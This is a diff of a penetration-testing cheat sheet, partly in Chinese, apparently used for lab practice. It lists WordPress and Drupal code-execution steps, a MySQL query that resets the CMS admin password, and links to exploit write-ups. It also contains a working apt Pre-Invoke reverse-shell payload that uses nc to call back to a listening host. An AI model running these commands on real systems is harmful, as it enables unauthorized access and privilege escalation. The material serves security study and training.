@@ -20,6 +20,7 @@
 1. wpscan扫描插件 + searchsploit
 2. Themes --> Editior --> 找个可以修改的php
 3. Plugins -> Add New -> this page
+4. https://bing0o.github.io/posts/pg-muddy/
 
 **Drupal**
 1. 安装php包(https://www.drupal.org/project/php)
@@ -164,6 +165,8 @@
 16. apt get crontab: payload - echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.114 1234 >/tmp/f"};' > shell and put it under /etc/apt/apt.conf.d
 17. Grafana exploits:https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/
 18. disk priviledge escalation: https://vk9-sec.com/disk-group-privilege-escalation/
+19. ![image](https://user-images.githubusercontent.com/105762605/231203807-39e5460e-7c06-4f7f-886c-a4440ade6fcb.png)
+
 
 **Mysql**
 1. update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'admin'))) where username = 'admin'; root用户修改密码。
